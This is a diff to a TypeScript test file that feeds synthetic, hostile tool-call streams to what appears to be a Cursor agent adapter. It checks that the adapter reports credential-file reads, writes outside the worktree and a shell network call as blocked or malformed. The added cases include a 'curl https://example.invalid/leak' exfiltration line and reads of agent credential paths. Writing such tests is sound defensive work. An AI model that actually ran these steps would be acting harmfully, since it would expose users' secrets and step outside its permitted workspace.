@@ -12,7 +12,8 @@ import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/c
 import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
 import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
 import type { ResolvedProfile } from "../../../src/adapters/types.js";
-import type { AdapterLegCase } from "../adapter-leg.js";
+import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
+import type { MaliciousFixture } from "../fixture.js";
 
 const SID = "synthetic-cursor-session-malicious";
 const META = (what: string, exit = 0) =>
@@ -150,6 +151,44 @@ const cursorCase: AdapterLegCase = {
     }),
   streams: (fx) => [
     {
+      name: "read of a credential path, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [META("credential read", 1), INIT, ...readCall("matrix-read", fx.codexAuthPath), RESULT_ERROR],
+    },
+    {
+      name: "write outside the worktree, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [META("outside write", 1), INIT, ...editCall("matrix-write", fx.outsideSentinel), RESULT_ERROR],
+    },
+    {
+      name: "shell write outside the worktree, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell outside write", 1),
+        INIT,
+        ...shellCall("matrix-shell-write", `touch ${fx.outsideSentinel}`),
+        RESULT_ERROR,
+      ],
+    },
+    {
+      name: "shell network call, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("network", 1),
+        INIT,
+        ...shellCall("matrix-network", "curl https://example.invalid/leak"),
+        RESULT_ERROR,
+      ],
+    },
+    {
       name: "read of a credential path",
       category: "credential_read",
       exitCode: 0,
@@ -212,6 +251,16 @@ const cursorCase: AdapterLegCase = {
       ],
     },
     {
+      name: "only unknown event kinds, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Invented event type, non-zero exit", 1),
+        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
+      ],
+    },
+    {
       name: "only unknown event kinds, clean exit",
       category: "unknown_events",
       exitCode: 0,
@@ -226,3 +275,31 @@ const cursorCase: AdapterLegCase = {
 };
 
 export default cursorCase;
+
+/** Synthetic malformed JSONL before and after each readable hostile call; no real provider is run. */
+export const cursorPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
+  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const call =
+      category === "credential_read"
+        ? readCall("partial-read", fx.claudeCredentialsPath)
+        : category === "out_of_worktree_write"
+          ? editCall("partial-write", fx.outsideSentinel)
+          : shellCall("partial-network", "curl https://example.invalid/leak");
+    return [0, 1].flatMap((exitCode) =>
+      (["before", "after"] as const).map(
+        (position): HostileStream => ({
+          name: `output cut ${position} ${category}, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "OUTPUT_PROTOCOL_ERROR",
+          lines: [
+            META(`output cut ${position} ${category}`, exitCode),
+            INIT,
+            ...(position === "before" ? ['{"type":"tool_'] : []),
+            ...call,
+            ...(position === "after" ? ['{"type":"result","subtype":'] : [RESULT_SUCCESS]),
+          ],
+        }),
+      ),
+    );
+  });
